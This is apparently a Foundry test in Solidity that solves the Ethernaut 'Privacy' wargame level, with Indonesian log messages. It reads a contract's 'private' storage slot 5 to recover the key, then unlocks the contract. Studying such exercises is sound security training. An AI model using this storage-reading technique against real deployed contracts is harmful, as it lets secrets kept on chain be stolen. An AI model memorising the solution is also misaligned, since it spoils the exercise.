// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../13-Privacy/PrivacyFactory.sol";
import "forge-std/Test.sol";

contract PrivacyAttack is Test {
    function testPrivacy() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address kacrut = makeAddr("kacrut");
        Ethernaut ethernaut = new Ethernaut();
        PrivacyFactory factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(kacrut, kacrut);
        address addr = ethernaut.createLevelInstance(factory);
        Privacy privacy = Privacy(addr);
        emit log("setup done.\nGoal: locked == false");
        bool terkunci = privacy.locked();
        assertTrue(terkunci);
        emit log(
            "cek slot menggunakan foundry:\nforge inspect --pretty src/Ethernaut/13-Privacy/Privacy.sol:Privacy storage"
        );
        emit log(
            "element array berukuran sesuai tipe, dan memakan 1 slot jika setiap elemen tidak cukup disimpan dalam size 32 bytes"
        );
        emit log("data[2] ada di slot 5");
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(key));
        emit log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}
